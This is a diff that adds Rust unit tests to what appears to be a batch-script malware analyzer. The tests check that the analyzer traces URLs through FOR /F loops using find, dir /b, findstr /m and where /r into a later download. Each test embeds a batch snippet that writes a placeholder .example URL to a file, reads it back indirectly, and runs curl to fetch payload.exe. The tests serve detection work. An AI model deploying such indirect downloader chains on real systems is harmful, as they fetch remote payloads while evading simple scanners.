@@ -2812,6 +2812,29 @@ for /f "tokens=* delims=" %%U in ('more first.txt second.txt ^| find "https://"'
     }
 
     #[test]
+    fn for_f_find_wildcard_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.txt
+echo https://for-f-find-wildcard.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('find "https://" *.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-find-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F find wildcard source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_find_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>web.txt
@@ -2921,6 +2944,265 @@ for /f "tokens=* delims=" %%U in ('sort urls.txt ^| find "https://"') do curl -o
                 )
             }),
             "FOR /F sort file source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_dir_b_discovers_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-dir-b.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('dir /b url.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b source did not discover generated file for later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_dir_b_wildcard_discovers_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.log
+echo https://for-f-dir-b-wildcard.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('dir /b *.txt') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b wildcard source did not discover generated file for later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_dir_b_without_path_lists_generated_current_dir_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.txt
+echo https://for-f-dir-b-current.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('dir /b') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b-current.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b without path did not list generated current-dir file for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_dir_b_current_dir_path_lists_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.txt
+echo https://for-f-dir-b-current-path.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('dir /b .\') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b-current-path.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b current-dir path did not list generated current-dir file for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_dir_b_path_wildcard_discovers_direct_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-dir-b-path-wildcard.example/payload.exe>C:\Work\url.txt
+echo https://for-f-dir-b-path-wildcard-wrong.example/payload.exe>C:\Work\Sub\url.txt
+for /f "tokens=* delims=" %%F in ('dir /b C:\Work\*.txt') do for /f "tokens=* delims=" %%U in ('type C:\Work\%%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b-path-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b path wildcard source did not discover direct generated file: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://for-f-dir-b-path-wildcard-wrong.example/payload.exe"
+                )
+            }),
+            "FOR /F dir /b path wildcard matched nested generated file: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_dir_s_b_path_wildcard_discovers_nested_generated_file_path() {
+        let report = analyze(
+            br#"echo https://for-f-dir-s-b-path-wildcard-nested.example/payload.exe>C:\Work\Sub\url.txt
+for /f "tokens=* delims=" %%F in ('dir /s /b C:\Work\*.txt') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-s-b-path-wildcard-nested.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /s /b path wildcard did not discover nested generated file path for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_dir_combined_b_s_path_wildcard_emits_full_generated_file_path() {
+        let report = analyze(
+            br#"echo https://for-f-dir-combined-b-s.example/payload.exe>C:\Work\url.txt
+for /f "tokens=* delims=" %%F in ('dir /b/s C:\Work\*.txt') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-combined-b-s.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b/s path wildcard did not emit a full generated file path for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_m_wildcard_discovers_matching_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.txt
+echo https://for-f-findstr-m-wildcard.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('findstr /m /c:"https://" *.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-m-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /m wildcard source did not discover matching generated file for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_s_m_path_wildcard_discovers_nested_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-findstr-s-m-wildcard.example/payload.exe>C:\Work\Sub\url.txt
+for /f "tokens=* delims=" %%F in ('findstr /s /m /c:"https://" C:\Work\*.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-s-m-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /s /m path wildcard did not discover nested generated file for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_s_m_bare_wildcard_emits_nested_generated_file_path() {
+        let report = analyze(
+            br#"echo https://for-f-findstr-s-m-bare-wildcard.example/payload.exe>Sub\url.txt
+for /f "tokens=* delims=" %%F in ('findstr /s /m /c:"https://" *.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-s-m-bare-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /s /m bare wildcard did not emit nested generated file path for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_where_recursive_wildcard_discovers_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-where-recursive-wildcard.example/payload.exe>C:\Work\Sub\url.txt
+for /f "tokens=* delims=" %%F in ('where /r C:\Work *.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-where-recursive-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F where /r wildcard source did not discover generated file for later type: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
